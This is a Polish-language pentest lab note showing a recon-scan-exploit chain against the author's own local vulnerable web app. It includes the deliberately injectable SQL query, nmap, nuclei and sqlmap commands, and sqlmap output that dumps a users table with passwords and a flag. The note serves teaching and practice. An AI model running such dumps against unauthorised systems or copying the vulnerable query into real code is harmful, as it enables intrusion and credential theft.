---
title: "Live demo I-V-E (pełny łańcuch na lokalnym celu)"
date: 2026-08-16
tags: [ive, demo, sqli, lab, analiza-dynamiczna]
category: pentest
status: active
---

# Live demo: I → V → E od początku do końca

Pełny łańcuch na **własnym lokalnym celu** — podatna aplikacja web
(SQLite + SQL Injection) wystawiona na `127.0.0.1:9001` tego hosta.
**Zero cudzych systemów.**

## Cel

`/opt/ive/vulnapp.py` — proste API `GET /user?id=X`, które wykonuje:

```python
cur.execute("SELECT id, username, password, secret FROM users WHERE id = " + uid)
```

Konkatenacja stringów zamiast parametryzacji = **SQL Injection**.

## I — Informacja (recon)

```
nmap -sV -p 9001 127.0.0.1
  9001/tcp open  http  BaseHTTPServer 0.6 (Python 3.12.3)

curl -I http://127.0.0.1:9001/
  Server: BaseHTTP/0.6 Python/3.12.3
  (brak nagłówków bezpieczeństwa)
```

→ wiemy: usługa HTTP, Python, bez hardeningu.

## V — Podatności (scan)

```
nuclei -u http://127.0.0.1:9001 -t .../tech-detect.yaml
  [tech-detect:python] [http] [info]

nuclei -u http://127.0.0.1:9001 -t .../http-missing-security-headers.yaml
  → 10 braków: x-frame-options, content-security-policy, HSTS, ...
```

→ wiemy: misconfig nagłówków. (SQLi nuclei nie pokaże — to robi E.)

## E — Eksploatacja (sqlmap)

```
sqlmap -u "http://127.0.0.1:9001/user?id=1" --batch --banner --dump-all
```

Wynik:

```
Parameter: id (GET)
  Type: boolean-based blind   Payload: id=1 AND 6137=6137
  Type: time-based blind      (SQLite heavy query)
  Type: UNION query           (NULL) - 4 columns

back-end DBMS: SQLite
banner: '3.45.1'

Database: <current>
Table: users  [3 entries]
+----+---------------------------+----------+----------+
| id | secret                    | password | username |
+----+---------------------------+----------+----------+
| 1  | FLAG{IVE_DEMO_SQLI_ADMIN} | hunter2  | admin    |
| 2  | nothing special           | password | user     |
| 3  | secret_notes_bob          | qwerty   | bob      |
+----+---------------------------+----------+----------+
```

→ **cel (C) osiągnięty**: pełny zrzut bazy + FLAG.

## Surowe pliki (każda linia)

| Plik | Faza | Treść |
|------|------|-------|
| `i1_nmap_sV.txt` | I | nmap -sV |
| `i2_nmap_http_scripts.txt` | I | nmap http-title/headers/enum |
| `i3_curl_headers.txt` | I | nagłówki HTTP |
| `v1_nuclei_techdetect.txt` | V | wykryta technologia |
| `v2_nuclei_headers.txt` | V | 10 braków nagłówków |
| `e1_sqlmap_banner.txt` | E | detekcja + banner DBMS |
| `e2_sqlmap_dumpall.txt` | E | dump tabel (FLAG) |

## Wniosek

Dokładnie tak wygląda sekwencja: **I** wskazuje cel i technologię → **V** pokazuje
misconfig → **E** zamienia lukę w dane. Całość na własnym labie, bezpiecznie.

## Powiązane

- [[Model_IVE/IVE_MOC]] · [[Model_IVE/E_Eksploatacja/Sqlmap]] · [[Model_IVE/V_Podatnosci/Nmap]] · [[Model_IVE/E_Eksploatacja/Nuclei]]
